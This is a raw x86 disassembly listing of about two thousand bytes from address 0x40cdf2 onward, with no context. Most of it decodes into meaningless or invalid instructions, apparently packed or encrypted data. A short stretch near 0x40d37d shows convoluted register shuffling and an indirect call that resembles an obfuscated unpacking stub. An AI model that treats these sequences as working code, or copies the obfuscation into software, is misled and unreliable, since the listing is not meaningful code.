  40cdf2:	and    BYTE PTR [ebp-0x31],bl
  40cdf5:	ret    0x7135
  40cdf8:	adc    DWORD PTR [ebx],ebx
  40cdfa:	call   0xa65f:0xe9cdd256
  40ce01:	rol    DWORD PTR ds:0x5911147c,0xbc
  40ce08:	(bad)  
  40ce09:	cwde   
  40ce0a:	arpl   WORD PTR [ebp+0x6c],ax
  40ce0d:	xchg   BYTE PTR [eax+0x40c2de83],ch
  40ce13:	rcl    BYTE PTR [eax+0x65],cl
  40ce16:	call   0xeb76:0xeb26e7f7
  40ce1d:	dec    ebp
  40ce1e:	adc    dh,0x41
  40ce21:	mov    cl,al
  40ce23:	dec    edx
  40ce24:	push   0x6c
  40ce26:	push   ecx
  40ce27:	repz repnz out 0x35,eax
  40ce2b:	retf   0xf4e3
  40ce2e:	inc    ebx
  40ce2f:	in     eax,0x67
  40ce31:	inc    ebp
  40ce32:	sub    WORD PTR ds:0xfe2fd025,ax
  40ce39:	sub    bh,BYTE PTR [esi+0x55]
  40ce3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce3d:	mov    WORD PTR [ebx+0x5e],cs
  40ce40:	mov    WORD PTR [edx-0x279f75a2],?
  40ce46:	inc    edi
  40ce47:	inc    ebp
  40ce48:	mov    ebp,0xfe12d8ad
  40ce4d:	pop    edx
  40ce4e:	mov    ds:0xd24dedbb,eax
  40ce53:	mov    ecx,ds
  40ce55:	inc    ebp
  40ce56:	(bad)  
  40ce58:	fwait
  40ce59:	sbb    dl,BYTE PTR [esi+0x19]
  40ce5c:	cmp    ecx,DWORD PTR [ecx]
  40ce5e:	test   DWORD PTR [ecx+0x8296fc5],esp
  40ce64:	mov    ebx,es
  40ce66:	jp     0x40ce8a
  40ce68:	(bad)  
  40ce69:	imul   esi,DWORD PTR [eax+0x31b798f9],0xfec5b2cd
  40ce73:	dec    ebp
  40ce74:	inc    esi
  40ce75:	mov    eax,0xda8a939a
  40ce7a:	jp     0x40ce4e
  40ce7c:	adc    dh,bh
  40ce7e:	add    ebx,DWORD PTR [ebx-0x57411474]
  40ce84:	sahf   
  40ce85:	sbb    esi,DWORD PTR [ebx+0x5f]
  40ce88:	dec    edi
  40ce89:	stc    
  40ce8a:	inc    esi
  40ce8b:	rol    BYTE PTR [edx-0x3d],cl
  40ce8e:	inc    eax
  40ce8f:	sbb    eax,0x544e042
  40ce94:	loopne 0x40cefe
  40ce96:	push   es
  40ce97:	(bad)  [ecx+0x2]
  40ce9a:	pushf  
  40ce9b:	fs hlt 
  40ce9d:	mov    eax,0x88de2764
  40cea2:	(bad)  
  40cea4:	add    al,0xc4
  40cea6:	xchg   ebp,eax
  40cea7:	jae    0x40ce75
  40cea9:	std    
  40ceaa:	rol    DWORD PTR cs:0xe9c6a141,1
  40ceb1:	jne    0x40cf29
  40ceb3:	adc    eax,0xa013df8
  40ceb8:	repz dec eax
  40ceba:	add    eax,DWORD PTR [ebx+0x2135b7ea]
  40cec0:	cmc    
  40cec1:	inc    esp
  40cec2:	sbb    DWORD PTR fs:[eax+0x36],edi
  40cec6:	and    eax,0x86b0aed7
  40cecb:	jo     0x40cebc
  40cecd:	mul    cl
  40cecf:	mov    edx,0xc8333054
  40ced4:	sbb    BYTE PTR [ebx+0x192e6d75],bl
  40ceda:	xchg   edi,eax
  40cedb:	pop    esi
  40cedc:	or     ecx,DWORD PTR [edx]
  40cede:	jns    0x40cf57
  40cee0:	push   eax
  40cee1:	mov    ebp,0xa2160c23
  40cee6:	mov    ebp,0x5994c64
  40ceeb:	pop    ebp
  40ceec:	ficom  WORD PTR [ecx-0x76]
  40ceef:	lods   al,BYTE PTR ds:[esi]
  40cef0:	sub    ebp,esi
  40cef2:	mov    ebp,0x774389bf
  40cef7:	out    dx,eax
  40cef8:	adc    BYTE PTR [edx-0x600d6a3a],dl
  40cefe:	aas    
  40ceff:	sti    
  40cf00:	push   ss
  40cf01:	inc    edi
  40cf02:	fwait
  40cf03:	and    eax,0x62991db5
  40cf08:	das    
  40cf09:	xchg   BYTE PTR [edi+ebp*4],ah
  40cf0c:	je     0x40cf70
  40cf0e:	jp     0x40cf44
  40cf10:	ror    DWORD PTR [ebx+ebx*4+0x3c],cl
  40cf14:	aaa    
  40cf15:	out    0x5c,al
  40cf17:	mov    dl,0xf2
  40cf19:	dec    esi
  40cf1a:	mov    BYTE PTR [edi-0x49ba9fd],bh
  40cf20:	sahf   
  40cf21:	jle    0x40ced8
  40cf23:	pop    ds
  40cf24:	xchg   ebp,eax
  40cf25:	(bad)  
  40cf26:	jo     0x40cec8
  40cf28:	add    eax,0xc8a5f302
  40cf2d:	add    DWORD PTR [esp+ebp*8+0x71998828],esp
  40cf34:	mov    ah,0x8e
  40cf36:	leave  
  40cf37:	cld    
  40cf38:	into   
  40cf39:	inc    ecx
  40cf3a:	sub    edi,DWORD PTR [edx]
  40cf3c:	jo     0x40cfac
  40cf3e:	dec    esp
  40cf3f:	adc    eax,0x6378358e
  40cf44:	out    0xa0,eax
  40cf46:	jnp    0x40cf74
  40cf48:	pop    ecx
  40cf49:	mov    edx,0x362946df
  40cf4e:	pop    ebp
  40cf4f:	aad    0x14
  40cf51:	mov    ah,0xe2
  40cf53:	rcr    DWORD PTR cs:[ecx+0x10016be2],cl
  40cf5a:	hlt    
  40cf5b:	mov    ch,0x1f
  40cf5d:	call   0x72eb3537
  40cf62:	and    ch,BYTE PTR [eax+0x36ec297]
  40cf68:	or     esp,DWORD PTR [ecx]
  40cf6a:	mov    bl,0x4f
  40cf6c:	sbb    DWORD PTR [edi-0x39],ecx
  40cf6f:	adc    ah,ch
  40cf71:	and    ebx,ebx
  40cf73:	test   BYTE PTR [eax+0x46],cl
  40cf76:	shr    BYTE PTR [esi-0x237b212],cl
  40cf7c:	dec    eax
  40cf7d:	sub    DWORD PTR [ebx+0x71],esp
  40cf80:	pop    ecx
  40cf81:	cmp    ecx,DWORD PTR [edx-0x3c150fbc]
  40cf87:	push   ecx
  40cf88:	aaa    
  40cf89:	mov    ah,0x10
  40cf8b:	add    eax,0x487ec0f3
  40cf90:	jne    0x40cfa6
  40cf92:	fcmovnbe st,st(6)
  40cf94:	int    0x8d
  40cf96:	cmp    BYTE PTR [ebx],dl
  40cf98:	cmp    DWORD PTR [edi+0x1a441c5],edi
  40cf9e:	mov    ds:0x73143c92,eax
  40cfa3:	and    esi,DWORD PTR [ebx*4+0x6dab2c81]
  40cfaa:	dec    ebx
  40cfab:	mov    eax,edx
  40cfad:	sbb    eax,0xd8be58e9
  40cfb2:	es jbe 0x40cf59
  40cfb5:	loope  0x40cf74
  40cfb7:	out    dx,eax
  40cfb8:	xchg   DWORD PTR [eax-0x3ea10312],ebx
  40cfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfbf:	sbb    BYTE PTR [esi+edx*4+0x583964f5],bh
  40cfc6:	xlat   BYTE PTR ds:[ebx]
  40cfc7:	sbb    edi,DWORD PTR [ecx+edi*8]
  40cfca:	inc    esi
  40cfcb:	mov    DWORD PTR [ebx+0x35],eax
  40cfce:	js     0x40cf90
  40cfd0:	aam    0x9c
  40cfd2:	add    al,0x58
  40cfd4:	mov    DWORD PTR [edi-0x2841fe04],ebp
  40cfda:	loopne 0x40d05a
  40cfdc:	loop   0x40cfe2
  40cfde:	les    ebx,FWORD PTR [ebx+0x4d]
  40cfe1:	push   ss
  40cfe2:	or     BYTE PTR [ecx],dl
  40cfe4:	leave  
  40cfe5:	ins    DWORD PTR es:[edi],dx
  40cfe6:	bound  esi,QWORD PTR [eax+0x39d23c76]
  40cfec:	dec    esi
  40cfed:	nop
  40cfee:	sbb    eax,0x9f1cca6f
  40cff3:	pushf  
  40cff4:	aad    0x8
  40cff6:	(bad)  
  40cff7:	sub    edi,DWORD PTR [eax+0x4f]
  40cffa:	pop    ss
  40cffb:	cmp    eax,0x93393193
  40d000:	xchg   BYTE PTR [ebx],al
  40d002:	and    al,bl
  40d004:	add    esp,DWORD PTR [ecx]
  40d006:	iret   
  40d007:	test   eax,0xa996d673
  40d00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d00d:	inc    esi
  40d00e:	mov    ch,dl
  40d010:	add    dh,ch
  40d012:	rol    BYTE PTR [edx+edx*1+0x20d3398],1
  40d019:	inc    eax
  40d01a:	lea    edx,[edx]
  40d01c:	fnstsw WORD PTR [edi+0x72a4fd80]
  40d022:	adc    eax,0x62911d9b
  40d027:	les    ecx,FWORD PTR [edi+0x531f2393]
  40d02d:	push   edi
  40d02e:	cmp    eax,0xb523a8b6
  40d033:	sbb    ecx,DWORD PTR [edx]
  40d035:	push   esp
  40d036:	add    eax,0xfb277346
  40d03b:	(bad)  
  40d03c:	out    0xc2,eax
  40d03e:	shr    edx,cl
  40d040:	mov    ecx,0x4d6f8ec
  40d045:	dec    ecx
  40d046:	xchg   esp,eax
  40d047:	fcmovb st,st(3)
  40d049:	imul   ecx,DWORD PTR [esp+ebx*1-0x3d]
  40d04e:	jno    0x40d07d
  40d050:	int    0x2b
  40d052:	fadd   st,st(3)
  40d054:	add    BYTE PTR [ebx+eax*1-0x9],ch
  40d058:	mov    eax,0xf5fe5f41
  40d05d:	sub    eax,0x9a1d6dd
  40d062:	or     eax,0x969ac359
  40d067:	inc    ecx
  40d068:	push   es
  40d069:	sahf   
  40d06a:	mov    eax,ds:0x7b32f0fc
  40d06f:	add    DWORD PTR [ebp-0x73],ebp
  40d072:	stos   DWORD PTR es:[edi],eax
  40d073:	jg     0x40d01f
  40d075:	push   eax
  40d076:	out    dx,eax
  40d077:	jecxz  0x40d0af
  40d079:	cmc    
  40d07a:	adc    ebx,DWORD PTR [edx+ecx*2-0x2a]
  40d07e:	fxch   st(5)
  40d080:	fistp  DWORD PTR ds:0x3477542d
  40d086:	fisubr WORD PTR [esp+edi*1-0x212f3be2]
  40d08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d08e:	imul   ebx,ebp,0xffffffe0
  40d091:	mov    es,WORD PTR [ebx-0x135e17dd]
  40d097:	cli    
  40d098:	inc    esi
  40d099:	lods   al,BYTE PTR ds:[esi]
  40d09a:	popa   
  40d09b:	push   ss
  40d09c:	sub    dl,al
  40d09e:	retf   0x7883
  40d0a1:	div    BYTE PTR [ecx-0x3770e3f0]
  40d0a7:	add    edi,ebp
  40d0a9:	scas   al,BYTE PTR es:[edi]
  40d0aa:	jp     0x40d0bc
  40d0ac:	or     bl,ah
  40d0ae:	push   es
  40d0af:	sub    BYTE PTR [edi],0x6f
  40d0b2:	cmp    DWORD PTR [esp+eax*1],edi
  40d0b5:	popf   
  40d0b6:	lahf   
  40d0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0b8:	jmp    0x687c25b6
  40d0bd:	or     DWORD PTR [edx+ebp*1-0x37],0xffffffb0
  40d0c2:	inc    DWORD PTR [ebx+eiz*1+0x3d289e10]
  40d0c9:	jmp    0x821f:0x2328191c
  40d0d0:	std    
  40d0d1:	or     ch,ah
  40d0d3:	dec    edi
  40d0d4:	sbb    cl,BYTE PTR [eax-0x8]
  40d0d7:	sbb    eax,0x4dec9c0b
  40d0dc:	daa    
  40d0dd:	xor    DWORD PTR [edx],0xffffffc1
  40d0e0:	int    0x5e
  40d0e2:	clc    
  40d0e3:	mov    edx,esp
  40d0e5:	call   0x1dbb3bc3
  40d0ea:	shl    ecx,cl
  40d0ec:	xor    al,0xfd
  40d0ee:	pop    ds
  40d0ef:	sub    eax,0xc9cd484f
  40d0f4:	cdq    
  40d0f5:	ins    DWORD PTR es:[edi],dx
  40d0f6:	mov    ebp,0xaf26484d
  40d0fb:	push   esp
  40d0fc:	adc    BYTE PTR [ebx+0x5a],ch
  40d0ff:	lods   al,BYTE PTR ds:[esi]
  40d100:	ret    
  40d101:	cli    
  40d102:	loop   0x40d178
  40d104:	cmp    al,0x21
  40d106:	sbb    ecx,DWORD PTR [ebx-0x1fb7b160]
  40d10c:	pop    edx
  40d10d:	clc    
  40d10e:	(bad)  
  40d10f:	pop    edx
  40d110:	ficom  DWORD PTR [eax]
  40d112:	xchg   ebx,eax
  40d113:	int3   
  40d114:	aas    
  40d115:	push   ebx
  40d116:	in     al,0xe8
  40d118:	popa   
  40d119:	add    al,bh
  40d11b:	jno    0x40d159
  40d11d:	xor    eax,0xe3832e94
  40d122:	(bad)  
  40d123:	cdq    
  40d124:	comiss xmm4,DWORD PTR [edx]
  40d127:	iret   
  40d128:	push   ebp
  40d129:	add    edi,0xa6125db3
  40d12f:	mov    ebp,0xfb02feec
  40d134:	leave  
  40d135:	mov    esp,0xd7e04d2b
  40d13a:	out    dx,al
  40d13b:	rcr    DWORD PTR [ebx],0x7f
  40d13e:	aaa    
  40d13f:	sub    esi,DWORD PTR [esi+0x43]
  40d142:	lahf   
  40d143:	ds loope 0x40d0d9
  40d146:	jecxz  0x40d19b
  40d148:	and    dl,BYTE PTR [ebp+0x1cb5e02a]
  40d14e:	push   cs
  40d14f:	mov    ds:0xf56c7ef9,al
  40d154:	inc    ebp
  40d155:	aaa    
  40d156:	sub    edx,DWORD PTR [eiz*4+0x1615601e]
  40d15d:	jnp    0x40d170
  40d15f:	test   BYTE PTR [edi],dl
  40d161:	adc    BYTE PTR [edi],0x56
  40d164:	outs   dx,DWORD PTR ds:[esi]
  40d165:	loopne 0x40d0ff
  40d167:	(bad)  
  40d168:	adc    ch,bl
  40d16a:	test   al,0x15
  40d16c:	cmp    DWORD PTR [ecx],edx
  40d16e:	out    dx,eax
  40d16f:	sub    ebp,edx
  40d171:	xchg   ebp,eax
  40d172:	mov    eax,ds:0xf45a23b4
  40d177:	pop    ds
  40d178:	jnp    0x40d1af
  40d17a:	adc    esp,DWORD PTR [esi+0x58]
  40d17d:	loop   0x40d154
  40d17f:	out    0x97,al
  40d181:	xor    eax,0x96088c81
  40d186:	dec    edx
  40d187:	rol    DWORD PTR [ebx],1
  40d189:	fsub   st,st(6)
  40d18b:	or     al,0x8e
  40d18d:	push   ds
  40d18e:	inc    edi
  40d18f:	mov    ?,WORD PTR [eax-0x23e3ff28]
  40d195:	jno    0x40d205
  40d197:	pop    esp
  40d198:	sti    
  40d199:	retf   
  40d19a:	out    dx,eax
  40d19b:	add    eax,0x6a5fca0d
  40d1a0:	dec    edx
  40d1a1:	js     0x40d202
  40d1a3:	push   edx
  40d1a4:	inc    edx
  40d1a5:	ret    
  40d1a6:	push   ebp
  40d1a7:	cmp    al,0x1b
  40d1a9:	es (bad) 
  40d1ab:	pop    edx
  40d1ac:	mov    al,0x80
  40d1ae:	cld    
  40d1af:	lahf   
  40d1b0:	ins    BYTE PTR es:[edi],dx
  40d1b1:	lahf   
  40d1b2:	pop    ebp
  40d1b3:	push   es
  40d1b4:	jns    0x40d1dc
  40d1b6:	pop    edi
  40d1b7:	sub    esp,esp
  40d1b9:	pop    eax
  40d1ba:	(bad)
  40d1bd:	pusha  
  40d1be:	push   ds
  40d1bf:	jl     0x40d236
  40d1c1:	add    dh,BYTE PTR [edx+0x6506e4a1]
  40d1c7:	addr16 push 0x78
  40d1ca:	xchg   esp,eax
  40d1cb:	or     BYTE PTR [edi-0x40ff3597],dl
  40d1d1:	adc    edi,DWORD PTR [edi-0x4e]
  40d1d4:	mov    ecx,0x3aa24bbd
  40d1d9:	jo     0x40d1e8
  40d1db:	cmp    BYTE PTR [edi+0x4d71f950],bh
  40d1e1:	sbb    bl,BYTE PTR [ecx]
  40d1e3:	pushf  
  40d1e4:	ss inc ebp
  40d1e6:	fmul   st(7),st
  40d1e8:	stos   DWORD PTR es:[edi],eax
  40d1e9:	stos   BYTE PTR es:[edi],al
  40d1ea:	adc    bh,BYTE PTR [edx+0x252984b3]
  40d1f0:	ficom  DWORD PTR [edi+0x1c53076b]
  40d1f6:	dec    esp
  40d1f7:	sar    BYTE PTR [edi+0x1],cl
  40d1fa:	out    0x3d,al
  40d1fc:	inc    edx
  40d1fd:	sub    al,al
  40d1ff:	dec    edi
  40d200:	scas   al,BYTE PTR es:[edi]
  40d201:	or     eax,0x3468b481
  40d206:	cmp    eax,0x62b2822d
  40d20b:	mov    ah,0xa9
  40d20d:	push   0xbd3745ac
  40d212:	ss dec ebx
  40d214:	and    ch,BYTE PTR [edx]
  40d216:	add    eax,DWORD PTR ss:[eax+eiz*1+0x3732b6f3]
  40d21e:	cmc    
  40d21f:	out    0xfb,al
  40d221:	shl    DWORD PTR [ebx-0x2f7985e7],cl
  40d227:	adc    DWORD PTR [edx+0x4e],0x7408fea0
  40d22e:	loop   0x40d29c
  40d230:	adc    al,0xcc
  40d232:	inc    esp
  40d233:	inc    ebx
  40d234:	adc    bh,ah
  40d236:	push   ecx
  40d237:	mov    ah,0x7
  40d239:	leave  
  40d23a:	popf   
  40d23b:	xor    eax,0xce170332
  40d240:	dec    ebp
  40d241:	arpl   WORD PTR ds:0x97d6d41d,dx
  40d247:	aaa    
  40d248:	popf   
  40d249:	push   DWORD PTR ds:0x9aae6545
  40d24f:	and    eax,0xa922185a
  40d254:	and    eax,0x2c4bfb28
  40d259:	ins    DWORD PTR es:[edi],dx
  40d25a:	sub    DWORD PTR [ebx+ecx*4+0x3b],edi
  40d25e:	cli    
  40d25f:	stos   DWORD PTR es:[edi],eax
  40d260:	hlt    
  40d261:	clc    
  40d262:	jo     0x40d26b
  40d264:	adc    ah,BYTE PTR [esi]
  40d266:	sub    ah,BYTE PTR [ebx-0x1b]
  40d269:	mov    al,ds:0x34672abd
  40d26e:	mov    esi,0x4e8e0f25
  40d273:	mov    ch,0xa9
  40d275:	xor    edi,DWORD PTR [eax+esi*1]
  40d278:	gs sbb ebx,ebx
  40d27b:	sub    BYTE PTR [eax],ch
  40d27d:	xrstors [ecx+0x6f]
  40d281:	ror    DWORD PTR [ecx+ebp*4+0x62],cl
  40d285:	test   BYTE PTR [edi-0x42fa01d4],bh
  40d28b:	jmp    0x7f966743
  40d290:	adc    al,0xb0
  40d292:	adc    DWORD PTR [ebp+0x57],ebp
  40d295:	stos   BYTE PTR es:[edi],al
  40d296:	test   eax,0x24b0e26
  40d29b:	fidiv  WORD PTR [ecx+0x40c1a0a0]
  40d2a1:	mov    edi,0xf3a27ff0
  40d2a6:	mov    cl,0xfb
  40d2a8:	pop    esi
  40d2a9:	(bad)  
  40d2aa:	fisttp QWORD PTR [ecx]
  40d2ac:	jno    0x40d26f
  40d2ae:	add    eax,0x63d67ec2
  40d2b3:	mov    al,BYTE PTR [edx+eiz*4]
  40d2b6:	sub    eax,0x3ae520ad
  40d2bb:	call   0x73fc95fa
  40d2c0:	jmp    0x40d2e6
  40d2c2:	aaa    
  40d2c3:	dec    ebx
  40d2c4:	mov    eax,ds:0x6514e5aa
  40d2c9:	jmp    FWORD PTR ds:0xe2bfaa68
  40d2cf:	jl     0x40d2f5
  40d2d1:	push   ds
  40d2d2:	xor    DWORD PTR [edi],edi
  40d2d4:	dec    esi
  40d2d5:	cld    
  40d2d6:	dec    ebx
  40d2d7:	mov    bh,0x3a
  40d2d9:	shr    cl,1
  40d2db:	outs   dx,DWORD PTR ds:[esi]
  40d2dc:	push   ebp
  40d2dd:	and    ebx,esi
  40d2df:	jle    0x40d2d3
  40d2e1:	push   cs
  40d2e2:	xor    edi,ebx
  40d2e4:	neg    DWORD PTR [ebp+0x3c]
  40d2e7:	mov    dh,BYTE PTR [edi]
  40d2e9:	and    eax,0xc36ddbbc
  40d2ee:	jno    0x40d32a
  40d2f0:	mov    dl,0xe3
  40d2f2:	cld    
  40d2f3:	mov    cl,0x56
  40d2f5:	jo     0x40d288
  40d2f7:	leave  
  40d2f8:	fadd   DWORD PTR ds:0x7dea9a0f
  40d2fe:	dec    edx
  40d2ff:	push   ebp
  40d300:	out    0xbb,eax
  40d302:	adc    DWORD PTR [edx+0x4c],ecx
  40d305:	std    
  40d306:	sbb    DWORD PTR [edi],esp
  40d308:	sti    
  40d309:	nop
  40d30a:	push   0xe394f77a
  40d30f:	call   0xc42618d2
  40d314:	sub    al,0x0
  40d316:	add    dl,BYTE PTR [esp+eiz*4+0x23f3f01a]
  40d31d:	fldenv [ebx]
  40d31f:	adc    BYTE PTR [ebx+0x7c],al
  40d322:	pop    es
  40d323:	icebp  
  40d324:	push   cs
  40d325:	bound  esp,QWORD PTR [edx+0x62]
  40d328:	push   0x8a71132a
  40d32d:	push   es
  40d32e:	inc    ecx
  40d32f:	push   esi
  40d330:	clc    
  40d331:	cmc    
  40d332:	xchg   esi,eax
  40d333:	pop    ebp
  40d334:	lock loop 0x40d2c7
  40d337:	data16 mov ch,0x42
  40d33a:	pop    ss
  40d33b:	jg     0x40d33d
  40d33d:	leave  
  40d33e:	sbb    edi,DWORD PTR [edx-0x6f]
  40d341:	out    0x7c,al
  40d343:	icebp  
  40d344:	sbb    bl,BYTE PTR [ecx-0x31c46361]
  40d34a:	pop    edx
  40d34b:	ins    BYTE PTR es:[edi],dx
  40d34c:	xor    ebx,DWORD PTR [edi]
  40d34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d34f:	das    
  40d350:	imul   edi,DWORD PTR [esi-0x46],0x50de999
  40d357:	add    ch,BYTE PTR [eax+ecx*4]
  40d35a:	jmp    0x40d353
  40d35c:	lods   al,BYTE PTR ds:[esi]
  40d35d:	cmp    ch,dl
  40d35f:	xchg   ch,bl
  40d361:	mov    ah,0x71
  40d363:	xor    ebx,ecx
  40d365:	add    ebp,DWORD PTR ds:0xb695c294
  40d36b:	test   al,dh
  40d36d:	and    al,0x21
  40d36f:	jecxz  0x40d2f9
  40d371:	clc    
  40d372:	sub    eax,0xdfab631
  40d377:	pop    edi
  40d378:	sub    DWORD PTR [eax-0x69],esp
  40d37b:	pop    esi
  40d37c:	xchg   ecx,eax
  40d37d:	mov    eax,0x1002c381
  40d382:	add    BYTE PTR [eax],al
  40d384:	lea    eax,[ebp-0x18]
  40d387:	add    edx,eax
  40d389:	add    edx,0x5
  40d38c:	push   edx
  40d38d:	inc    esi
  40d38e:	pop    ecx
  40d38f:	dec    ecx
  40d390:	xchg   ecx,eax
  40d391:	dec    eax
  40d392:	xchg   ecx,eax
  40d393:	dec    ecx
  40d394:	xchg   ecx,edx
  40d396:	dec    edx
  40d397:	push   edx
  40d398:	mov    edx,ebx
  40d39a:	pop    ebx
  40d39b:	dec    ebx
  40d39c:	call   DWORD PTR [ebx]
  40d39e:	cmp    DWORD PTR [ebp+0x10],esi
  40d3a1:	je     0x40f754
  40d3a7:	xchg   edx,eax
  40d3a8:	push   0xc
  40d3aa:	pop    ecx
  40d3ab:	dec    ecx
  40d3ac:	push   0x3
  40d3ae:	pop    ebx
  40d3af:	inc    ebx
  40d3b0:	xchg   ebx,ecx
  40d3b2:	inc    ecx
  40d3b3:	sub    ebx,ecx
  40d3b5:	xchg   ebx,ecx
  40d3b7:	dec    ecx
  40d3b8:	dec    ecx
  40d3b9:	mov    eax,DWORD PTR [ebp-0x1c]
  40d3bc:	imul   eax,ecx
  40d3bf:	jmp    0x40f751
  40d3c4:	inc    eax
  40d3c5:	sbb    edx,DWORD PTR [ebp-0x1e]
  40d3c8:	push   edx
  40d3c9:	mov    ds:0x35198590,al
  40d3ce:	aad    0x91
  40d3d0:	je     0x40d3f9
  40d3d2:	push   cs
  40d3d3:	in     al,0xb2
  40d3d5:	rol    DWORD PTR [ebx-0x7ca1f37d],cl
  40d3db:	xor    esi,0xffffff94
  40d3de:	push   edi
  40d3df:	(bad)  
  40d3e1:	sub    ecx,DWORD PTR [edi+0x1d]
  40d3e4:	adc    edx,DWORD PTR [eax+ebx*1-0x61]
  40d3e8:	push   ebp
  40d3e9:	pusha  
  40d3ea:	push   cs
  40d3eb:	fld    QWORD PTR [bp+di]
  40d3ee:	xchg   edx,eax
  40d3ef:	sub    dl,bh
  40d3f1:	in     al,dx
  40d3f2:	mov    edi,0x52a6b9ae
  40d3f7:	push   esp
  40d3f8:	pop    ebp
  40d3f9:	(bad)  
  40d3fa:	dec    esp
  40d3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3fc:	out    dx,al
  40d3fd:	jo     0x40d3be
  40d3ff:	iret   
  40d400:	enter  0x4005,0xad
  40d404:	daa    
  40d405:	mov    edx,0x74ef49c2
  40d40a:	xchg   ecx,eax
  40d40b:	push   edi
  40d40c:	and    DWORD PTR [ebx+0x78ae1243],0x14
  40d413:	xchg   ebp,eax
  40d414:	int3   
  40d415:	adc    eax,0x5b347682
  40d41a:	pushf  
  40d41b:	packsswb mm6,mm5
  40d41e:	mov    esi,0x62d8bb43
  40d423:	mov    ebp,DWORD PTR [ebp+0x206aa7a1]
  40d429:	push   edi
  40d42a:	push   0x7d
  40d42c:	mov    ebx,0xdcf5b984
  40d431:	cmc    
  40d432:	jp     0x40d455
  40d434:	bound  eax,QWORD PTR [eax]
  40d436:	add    DWORD PTR [eax+0xd],edx
  40d439:	sub    eax,0xbc00bdaf
  40d43e:	pop    edi
  40d43f:	pop    ebx
  40d440:	out    dx,eax
  40d441:	into   
  40d442:	lods   eax,DWORD PTR ds:[esi]
  40d443:	pop    ss
  40d444:	xor    eax,0x9cbe58c6
  40d449:	adc    al,0xeb
  40d44b:	push   es
  40d44c:	cmp    eax,0x7d48f969
  40d451:	mov    edx,0x84822735
  40d456:	aas    
  40d457:	mov    bl,0x6b
  40d459:	mov    DWORD PTR [edi+0x614ce2e],esi
  40d45f:	jecxz  0x40d4aa
  40d461:	mov    ds:0xa9a16d89,al
  40d466:	push   ds
  40d467:	aad    0xca
  40d469:	cld    
  40d46a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46b:	imul   ebp,edi,0xbb891ca7
  40d471:	rol    DWORD PTR [esp+ecx*2],1
  40d474:	and    esi,DWORD PTR [ebp+0x36609a29]
  40d47a:	stc    
  40d47b:	xor    eax,0x90e8584
  40d480:	sub    al,0xfa
  40d482:	dec    edi
  40d483:	inc    edx
  40d484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d485:	dec    ecx
  40d486:	inc    esp
  40d487:	je     0x40d448
  40d489:	inc    ecx
  40d48a:	(bad)  
  40d48b:	dec    edx
  40d48c:	dec    eax
  40d48d:	sub    BYTE PTR [ebp-0x56cd62cc],0x56
  40d494:	mov    ch,BYTE PTR [edi+0x4a0f4022]
  40d49a:	fst    QWORD PTR [ebx]
  40d49c:	pop    ecx
  40d49d:	div    BYTE PTR [eax]
  40d49f:	sbb    BYTE PTR [edx-0x54eb7f7e],ch
  40d4a5:	rol    BYTE PTR [ebx+0x7b368edb],cl
  40d4ab:	and    DWORD PTR [eax+0x27],ecx
  40d4ae:	das    
  40d4af:	mov    ah,0x10
  40d4b1:	mov    dh,0x20
  40d4b3:	je     0x40d50e
  40d4b5:	adc    DWORD PTR [ecx-0x1c],ecx
  40d4b8:	add    bl,ch
  40d4ba:	jge    0x40d520
  40d4bc:	mul    BYTE PTR cs:[ecx-0x63e3519f]
  40d4c3:	inc    ebp
  40d4c4:	jns    0x40d4ff
  40d4c6:	fs and eax,0xdd6f5c34
  40d4cc:	fimul  DWORD PTR [eax+0x5c9bbe2d]
  40d4d2:	xchg   DWORD PTR [edi],eax
  40d4d4:	push   ss
  40d4d5:	sbb    BYTE PTR [edi+eiz*1+0x51],bh
  40d4d9:	sub    esp,ecx
  40d4db:	test   DWORD PTR [edx+0x58],0x10a93e0e
  40d4e2:	push   ebp
  40d4e3:	rcl    BYTE PTR [ecx+0x63],cl
  40d4e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e7:	add    al,0xf2
  40d4e9:	and    eax,0xa441bc70
  40d4ee:	icebp  
  40d4ef:	test   DWORD PTR [ebp+0x17ba6abf],ebp
  40d4f5:	jo     0x40d480
  40d4f7:	fisubr DWORD PTR [esi-0x30]
  40d4fa:	mov    bh,BYTE PTR [edi-0x10]
  40d4fd:	add    eax,0xac757c99
  40d502:	jae    0x40d571
  40d504:	sahf   
  40d505:	pusha  
  40d506:	mov    ah,0x52
  40d508:	sbb    al,0xc7
  40d50a:	jmp    0x2f63:0xd35bb9ae
  40d511:	hlt    
  40d512:	rcr    esp,cl
  40d514:	bound  ebp,QWORD PTR [ebx-0x74f34369]
  40d51a:	adc    eax,0x29a10f5b
  40d51f:	aad    0xf5
  40d521:	inc    ecx
  40d522:	inc    eax
  40d523:	retf   
  40d524:	(bad)  
  40d525:	mov    ebx,0xa2787fa
  40d52a:	sub    eax,0xe5601f8a
  40d52f:	xor    esi,DWORD PTR [edx]
  40d531:	jo     0x40d528
  40d533:	adc    eax,0xfe77a6ce
  40d538:	int3   
  40d539:	mov    eax,0x30599ba1
  40d53e:	sti    
  40d53f:	ffreep st(3)
  40d541:	scas   al,BYTE PTR es:[edi]
  40d542:	cdq    
  40d543:	dec    ebp
  40d544:	add    esp,esi
  40d546:	icebp  
  40d547:	cld    
  40d548:	fcomp  DWORD PTR [eax]
  40d54a:	mov    edx,DWORD PTR [ebp+0x7c]
  40d54d:	and    al,0x54
  40d54f:	or     DWORD PTR [ebx-0x11],esi
  40d552:	fld    st(1)
  40d554:	ja     0x40d558
  40d556:	leave  
  40d557:	(bad)  [ebx+0x2f]
  40d55a:	pop    esp
  40d55b:	mov    DWORD PTR [ecx-0x61bfb799],eax
  40d561:	std    
  40d562:	add    esi,DWORD PTR [esi+0x6383eb5a]
  40d568:	loope  0x40d52a
  40d56a:	(bad)  
  40d56b:	sub    edx,DWORD PTR [edx+0x4def78e1]
  40d571:	pop    ds
  40d572:	dec    esp
  40d573:	push   ecx
  40d574:	mov    al,0xbc
  40d576:	loopne 0x40d56c
  40d578:	test   BYTE PTR ds:0x53adce3b,0x99
  40d57f:	jmp    0x40d5f9
